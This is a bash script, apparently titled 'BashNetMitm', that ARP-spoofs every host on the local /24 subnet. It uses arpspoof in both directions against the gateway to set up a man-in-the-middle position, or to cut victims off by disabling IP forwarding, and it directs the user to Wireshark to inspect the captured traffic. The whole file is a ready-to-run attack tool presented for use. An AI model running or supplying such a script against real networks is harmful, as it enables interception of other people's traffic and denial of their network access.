#!/bin/bash

if [ "$EUID" != 0 ]
  then echo "Please run as root !"
  exit
fi

#Getting useful informations

GATEWAY_IP=$(/sbin/ip route | awk '/default/ { print $3 }')
LOCAL_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

read A B C D <<<"${LOCAL_IP//./ }"
read E F G H <<<"${GATEWAY_IP//./ }"

printf "\n"
   
echo 11010101101010100010101011010001101101011101010100100101010100101010001010
echo 00101010101011101010101000101010101010001010110101010110110101101010111010
echo 11010101011010101010110010101010101010101011011010101011010100110010101011
echo 01010101010100001010101001 CODED BY LOCALH0ST 1010100101001010100100101010
echo 10101010010101010101010101101010101010100101010101001001101010101010010101
echo 10101010101001010100101010100010010101001010101101101110101010101000101011
echo 01011010101001010101001010101010101010010101010100101101010110111010100101
echo "linktr.ee/localh0st        twitter : localhostt        github : localhostt"
printf "__________________________________________________________________________\n"
printf "\n"

printf "Detecting your local and gateway IPv4...\n"
printf "\n"
sleep 1
printf "Your Local IP is $LOCAL_IP \n"
printf "Your Gateway IP is $GATEWAY_IP \n"

printf "__________________________________________________________________________\n"
printf "\n"

printf "Specify the interface (wlan0/eth0/usb0/bnep0) ---> "
read INTERFACE
while [ $INTERFACE != "wlan0" ] && [ $INTERFACE != "eth0" ] && [ $INTERFACE != "usb0" ] && [ $INTERFACE != "bnep0" ]
  do
    printf "Wrong input, retry again\n"
    printf "Specify the interface (wlan0/eth0/usb0/bnep0) ---> "
    read INTERFACE
  done

printf "__________________________________________________________________________\n"
printf "\n"

printf "Choose the purpose of spoofing (mitm/cutoff) ---> "
read PURPOSE
while [ $PURPOSE != "mitm" ] && [ $PURPOSE != "cutoff" ]
  do
    printf "Wrong input, retry again\n"
    printf "Choose the purpose of spoofing (mitm/cutoff) ---> "
    read PURPOSE
  done

if [ $PURPOSE == "mitm" ]
  then
    sysctl net.ipv4.ip_forward=1
elif [ $PURPOSE == "cutoff" ]
  then 
    sysctl net.ipv4.ip_forward=0
fi

echo Proceeding in 3 seconds...
sleep 3
printf "__________________________________________________________________________\n"
printf "\n"

#The arp spoofing must be two-sided:
#router-->victims exculding router and localhost from victims 
#victims-->router excluding localhost from victims

i=1
j=1

while [ "$i" -le  254 ]
  do

    if [ "$i" -eq $D ]
      then 
        i=$(( $i+1 ))
    fi

    arpspoof -i $INTERFACE -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
    i=$(( $i+1 ))
  done

while [ "$j" -le  254 ]
  do

    if [ "$j" -eq $D ] || [ "$j" -eq $H ]
      then 
        j=$(( $j +1 ))
    fi

    arpspoof -i $INTERFACE -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
    j=$(( $j+1 ))
  done

printf "The process is running in background :D\n"
printf "\n"
printf "Use Wireshark to check the results\n"
printf "\n"
printf "Type 'stop' to stop the spoofing process ---> "
read EXITSTATUS
if [ $EXITSTATUS == "stop" ]
  then 
    printf "Thank you for using BashNetMitm !"
    killall arpspoof
    sleep 5
    exit
  else 
    printf "Ignoring operation\n"
fi

while [ $EXITSTATUS != "stop" ]
  do
    printf "Type 'stop' to stop the spoofing process\n"
    read EXITSTATUS
    if [ $EXITSTATUS == "stop" ]
      then 
        printf "Thank you for using BashNetMitm !\n"
        killall arpspoof
        sleep 5
        exit
      else 
        printf "Ignoring operation\n"
    fi
done
